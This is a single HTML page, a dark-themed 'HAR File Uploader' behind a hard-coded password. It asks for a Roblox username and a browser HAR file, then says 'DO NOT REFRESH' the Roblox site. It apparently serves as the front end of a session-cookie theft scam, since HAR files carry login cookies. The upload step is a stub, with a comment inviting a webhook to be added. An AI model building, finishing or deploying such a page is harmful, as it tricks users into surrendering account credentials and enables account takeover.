<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HAR File Uploader</title>
  <style>
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      background-color: #1e1e1e;
      padding: 30px 40px;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }

    input[type="password"],
    input[type="text"],
    input[type="file"],
    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }

    input[type="password"],
    input[type="text"] {
      background-color: #2a2a2a;
      color: #ffffff;
    }

    input[type="file"] {
      background-color: #2a2a2a;
      color: #ffffff;
      cursor: pointer;
    }

    button {
      background-color: #007bff;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    #upload-section {
      display: none;
    }

    #final-message {
      background-color: #0d47a1;
      color: #ffffff;
      font-weight: bold;
      padding: 10px;
      border-radius: 5px;
      margin-top: 20px;
      display: none;
    }

    #error-message {
      color: red;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="password-section">
      <h2>Enter Password</h2>
      <input type="password" id="password" placeholder="Password">
      <button onclick="checkPassword()">Enter</button>
      <div id="error-message"></div>
    </div>

    <div id="upload-section">
      <h2>Upload HAR File</h2>
      <input type="text" id="username" placeholder="Roblox Username">
      <input type="file" id="har-file" accept=".har">
      <button onclick="submitUpload()">Submit</button>
      <div id="final-message">Now go back to the Roblox website and DO NOT REFRESH.</div>
    </div>
  </div>

  <script>
    const correctPassword = "EchoTrails2025";

    function checkPassword() {
      const input = document.getElementById("password").value;
      const errorMsg = document.getElementById("error-message");
      if (input === correctPassword) {
        document.getElementById("password-section").style.display = "none";
        document.getElementById("upload-section").style.display = "block";
      } else {
        errorMsg.textContent = "Incorrect password. Try again.";
      }
    }

    function submitUpload() {
      const fileInput = document.getElementById("har-file");
      const file = fileInput.files[0];
      if (!file || !file.name.endsWith(".har")) {
        alert("Please upload a valid HAR file.");
        return;
      }
      // You can add code here to upload the file to a server/webhook if needed
      document.getElementById("final-message").style.display = "block";
    }
  </script>
</body>
</html>
